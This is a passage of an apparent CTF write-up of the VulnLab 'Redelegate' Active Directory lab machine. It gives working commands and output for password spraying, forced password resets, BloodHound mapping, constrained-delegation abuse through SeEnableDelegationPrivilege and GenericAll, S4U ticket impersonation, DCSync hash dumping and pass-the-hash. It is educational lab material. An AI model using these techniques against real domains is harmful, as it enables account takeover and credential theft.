SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:cn4KOEgsHqvKXPjEnSD9 STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:cn4KOEgsHqvKXPjEnSD9 STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:cn4KOEgsHqvKXPjEnSD9 STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:Spring2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Marie.Curie:Spring2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:Spring2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:Spring2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:Spring2024! STATUS_ACCOUNT_RESTRICTION  
SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:Spring2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:Spring2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:Spring2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:Summer2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Marie.Curie:Summer2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:Summer2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:Summer2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:Summer2024! STATUS_ACCOUNT_RESTRICTION  
SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:Summer2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:Summer2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:Summer2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:Fall2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [+] redelegate.vl\Marie.Curie:Fall2024!♟️♟️♟️♟️  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:Fall2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:Fall2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:Fall2024! STATUS_ACCOUNT_RESTRICTION  
SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:Fall2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:Fall2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:Fall2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:Autumn2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:Autumn2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:Autumn2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:Autumn2024! STATUS_ACCOUNT_RESTRICTION  
SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:Autumn2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:Autumn2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:Autumn2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:Winter2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:Winter2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:Winter2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:Winter2024! STATUS_ACCOUNT_RESTRICTION  
SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:Winter2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:Winter2024! STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:Winter2024! STATUS_LOGON_FAILURE
```

And **here we go, here we go** **marie.curie** has a valid password! Time to check its **validation**, as usual, using **NetExec**. Let’s see what level of access we’ve got this time.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc smb 10.10.122.41 -u Marie.Curie -p 'Fall2024!'  
SMB 10.10.122.41 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)  
SMB 10.10.122.41 445 DC [+] redelegate.vl\Marie.Curie:Fall2024!  
  
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc mssql 10.10.122.41 -u Marie.Curie -p 'Fall2024!'  
MSSQL 10.10.122.41 1433 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)  
MSSQL 10.10.122.41 1433 DC [+] redelegate.vl\Marie.Curie:Fall2024!  
  
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc winrm 10.10.122.41 -u Marie.Curie -p 'Fall2024!'  
WINRM 10.10.122.41 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.122.41 5985 DC [-] redelegate.vl\Marie.Curie:Fall2024!  
  
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc rdp 10.10.122.41 -u Marie.Curie -p 'Fall2024!'  
RDP 10.10.122.41 3389 DC [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC) (domain:redelegate.vl) (nla:True)  
RDP 10.10.122.41 3389 DC [+] redelegate.vl\Marie.Curie:Fall2024!
```

SMB access? **Great.** RDP? **What?** No, no, **don’t even think like that**, because **RDP isn’t going to work for you**. It’s locked down with **Restricted Mode**, and unless you’re a **Domain Admin**, you’re not getting past that — just like in the **Trusted** machine, where I **did bypass it**.

But for now, we’ve got **SMB access**, which means it’s **time to fire up BloodHound-python-ce** and start mapping out this domain. Let’s hunt.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# bloodhound-ce-python -d redelegate.vl -u Marie.Curie -p 'Fall2024!' -c all -ns 10.10.122.41  
INFO: BloodHound.py for BloodHound Community Edition  
INFO: Found AD domain: redelegate.vl  
INFO: Getting TGT for user  
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.redelegate.vl:88)] [Errno -2] Name or service not known  
INFO: Connecting to LDAP server: dc.redelegate.vl  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 2 computers  
INFO: Connecting to LDAP server: dc.redelegate.vl  
INFO: Found 12 users  
INFO: Found 56 groups  
INFO: Found 2 gpos  
INFO: Found 1 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer:  
INFO: Querying computer: dc.redelegate.vl  
WARNING: SID S-1-5-21-3745110700-3336928118-3915974013-1109 lookup failed, return status: STATUS_NONE_MAPPED  
INFO: Done in 00M 24S
```

> Attention! You have to use bloodhound-ce-python because we’re working with BloodHound Community Edition . And if you want it to run smoothly and with perfect performance , you better be using the latest ingestors , right? No outdated tools — only sharp claws for this hunt.

![](https://cdn-images-1.medium.com/max/1200/1*B78szT3VXQx-PPnexr0ZBA.png)

*Shortest paths from principals we owned to high value targets*

![](https://cdn-images-1.medium.com/max/1200/1*iWV_0fO9VxKsf6_MSZ0M0w.png)

*Oh, you mean thatsharp, precise arrowpointing straight topwnage?Good?Nah,perfect.Let’s keep it rolling.*

Like you see, **Marie Curie** is a member of **Helpdesk**, and guess what? **Helpdesk** has **ForceChangePassword** permissions over **Helen T.**. What does that mean? **Simple** — we can change **Helen’s** password and log in as **her**. The domain just handed us another key — let’s use it.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# net rpc password "Helen.Frost" -U "redelegate.vl"/"marie.Curie" -S 10.10.122.41  
Enter new password for Helen.Frost:  
Password for [REDELEGATE.VL\marie.Curie]:  
Failed to set password for 'Helen.Frost' with error: Unable to update the password. The value provided for the new password does not meet the length, complexity, or history requirements of the domain..  
  
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc smb 10.10.122.41 -u Marie.Curie -p 'Fall2024!' --pass-pol  
SMB 10.10.122.41 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)  
SMB 10.10.122.41 445 DC [+] redelegate.vl\Marie.Curie:Fall2024!  
SMB 10.10.122.41 445 DC [+] Dumping password info for domain: REDELEGATE  
SMB 10.10.122.41 445 DC Minimum password length: 7  
SMB 10.10.122.41 445 DC Password history length: 24  
SMB 10.10.122.41 445 DC Maximum password age: 41 days 23 hours 53 minutes  
SMB 10.10.122.41 445 DC  
SMB 10.10.122.41 445 DC Password Complexity Flags: 000001  
SMB 10.10.122.41 445 DC Domain Refuse Password Change: 0  
SMB 10.10.122.41 445 DC Domain Password Store Cleartext: 0  
SMB 10.10.122.41 445 DC Domain Password Lockout Admins: 0  
SMB 10.10.122.41 445 DC Domain Password No Clear Change: 0  
SMB 10.10.122.41 445 DC Domain Password No Anon Change: 0  
SMB 10.10.122.41 445 DC Domain Password Complex: 1  
SMB 10.10.122.41 445 DC  
SMB 10.10.122.41 445 DC Minimum password age: 1 day 4 minutes  
SMB 10.10.122.41 445 DC Reset Account Lockout Counter: 10 minutes  
SMB 10.10.122.41 445 DC Locked Account Duration: 10 minutes  
SMB 10.10.122.41 445 DC Account Lockout Threshold: None  
SMB 10.10.122.41 445 DC Forced Log off Time: Not Set
```

But **failed** to set the password… **Why?!**

Simple I used a password that **didn’t meet the domain’s password policy**. That’s why I checked the **password policy** using **NetExec** to make sure I set a password that actually fits. **Lesson learned:** **always check the policy before changing passwords**, or you’ll be hitting a brick wall.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# net rpc password "Helen.Frost" -U "redelegate.vl"/"marie.Curie" -S 10.10.122.41  
Enter new password for Helen.Frost:  
Password for [REDELEGATE.VL\marie.Curie]:                                                                                             
```

I set another **season-themed password** ♟ **LOL**, and now, as usual, it’s time to **check for validation**. Let’s see if **Helen** is about to open some new doors for us.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc smb 10.10.122.41 -u Helen.Frost -p 'Fall2024!'  
SMB 10.10.122.41 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)  
SMB 10.10.122.41 445 DC [+] redelegate.vl\Helen.Frost:Fall2024!  
  
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc winrm 10.10.122.41 -u Helen.Frost -p 'Fall2024!'  
WINRM 10.10.122.41 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.122.41 5985 DC [+] redelegate.vl\Helen.Frost:Fall2024! (Pwn3d!)
```

And **let’s gooo!** We can now log in as **Helen** using **PowerShell Remoting**. Time to see what kind of **damage** we can do from here. Let’s escalate.

![](https://cdn-images-1.medium.com/max/800/1*xTh8xxrVnzFNmpxdGz3GAg.png)

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> whoami /all  
  
USER INFORMATION  
----------------  
  
User Name SID  
====================== ==============================================  
redelegate\helen.frost S-1-5-21-4024337825-2033394866-2055507597-1106  
  
  
GROUP INFORMATION  
-----------------  
  
Group Name Type SID Attributes  
=========================================== ================ ============================================== ==================================================  
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group  
REDELEGATE\IT Group S-1-5-21-4024337825-2033394866-2055507597-1113 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label S-1-16-8448  
  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name Description State  
============================= ============================================================== =======  
SeMachineAccountPrivilege Add workstations to domain Enabled  
SeChangeNotifyPrivilege Bypass traverse checking Enabled  
SeEnableDelegationPrivilege Enable computer and user accounts to be trusted for delegation Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
  
  
USER CLAIMS INFORMATION  
-----------------------  
  
User claims unknown.  
  
Kerberos support for Dynamic Access Control on this device has been disabled.
```

So, what time is it now? **Privilege escalation time.**

I didn’t run any **Windows privilege escalation tools**, but you definitely can. I highly recommend **PrivCheck** and **WinPEAS** and there’s even a **new **[**one** ](https://github.com/yehia-mamdouh/ZeroProbe)worth checking out.

But let’s focus on **our privileges** what do we see? **SeEnableDelegationPrivilege.**

With this privilege, we can configure **delegation attributes** on a service, leading to either **unconstrained** or **constrained delegation**. However, for this to work, we need the ability to **add a machine account** or have **control over one**. In our case? **Machine quota is set to 0.** That means we **can’t create new machine accounts**, so we’ll need a different approach.

**Checking For Machine AccountQuota**

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc ldap 10.10.122.41 -u Helen.Frost -p 'Fall2024!' -M maq  
SMB 10.10.122.41 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.122.41 389 DC [+] redelegate.vl\Helen.Frost:Fall2024!  
MAQ 10.10.122.41 389 DC [*] Getting the MachineAccountQuota  
MAQ 10.10.122.41 389 DC MachineAccountQuota: 0
```

But **if you focus on the previous BloodHound graph**, you’ll notice something **interesting** — we have **GenericAll** over the **F01 machine**.

What does that mean? **We can reset its password, log in as it, and see what we can do.** And maybe — just maybe — we can configure **constrained delegation attributes** from there, right? Let’s find out.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# net rpc password "FS01$" -U "redelegate.vl"/"Helen.Frost" -S 10.10.122.41  
Enter new password for FS01$:  
Password for [REDELEGATE.VL\Helen.Frost]:
```

But wait — you can **abuse this with BloodyAD**, and that’s a solid option. However, I’ll be using **good old net commands in Kali** instead. Let’s get to work.

As you know, to **configure constrained delegation**, you need to enable **two attributes**:

1. **TRUSTED_TO_AUTH_FOR_DELEGATION** — This enables delegation.
2. **msDS-AllowedToDelegateTo** — This specifies which service we can delegate to.

I highly recommend **reading up on these two** for a deeper understanding.

> 🔗 [https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/](https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/)

> 🔗 [https://labs.lares.com/fear-kerberos-pt4/](https://labs.lares.com/fear-kerberos-pt4/)

```powershell
Set-ADComputer -Identity FS01 -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc.redelegate.vl')}  
Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```

You can verify these properties by checking for computers that are **configured with constrained delegation**. To do this, I’ll use **Impacket’s findDelegation** tool.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# impacket-findDelegation -dc-ip 10.10.122.41 redelegate.vl/Helen.Frost:'Fall2024!'  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
AccountName AccountType DelegationType DelegationRightsTo SPN Exists  
----------- ----------- ---------------------------------- --------------------- ----------  
FS01$ Computer Constrained w/ Protocol Transition cifs/dc.redelegate.vl No 
```

Now, make sure to add **dc.redelegate.vl** to your **/etc/hosts**, then run **impacket-getST.py** to proceed.

If you try to impersonate **Administrator**, you’ll hit an error — unfortunately, **Administrator can’t be delegated** because it has the **“Account is sensitive and cannot be delegated”** attribute. You can confirm this in **BloodHound**. That’s why I chose **ryan.cooper** instead.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# getST.py -impersonate ryan.cooper -spn cifs/dc.redelegate.vl 'redelegate.vl/FS01$':'Fall2024!'  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Impersonating ryan.cooper  
[*] Requesting S4U2self  
[*] Requesting S4U2Proxy  
[*] Saving ticket in ryan.cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# impacket-secretsdump redelegate.vl/ryan.cooper@dc.redelegate.vl -k -no-pass
```
Now, you can **export your ticket** and either **log in using psexec** or go straight for **DCSync** to dump all the hashes. Once you have the **Administrator hash**, just **pass-the-hash** and… **PWNED!**

Final words:

I hope this walkthrough was clear and that you learned something new along the way. This write-up was made with love by **Mohamed Eletrepy aka Maverick**. Keep hacking, stay curious, and never stop learning. Until next time — happy hacking! 🚀🔥

### Attack Path Overview

![](https://cdn-images-1.medium.com/max/800/1*xxLZcTid5WnmC0V7B3NX2w.png)

![](https://cdn-images-1.medium.com/max/800/1*K-iK1dU0y4mD8Aw32-Y8ow.png)

---

### Wanna Keep in Touch with Maverick?

![](https://cdn-images-1.medium.com/max/800/0*gqQJ-6Ee5wWjOszg.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

By Mohamed Eletreby on March 11, 2025.

Canonical link

Exported from Medium on April 20, 2026.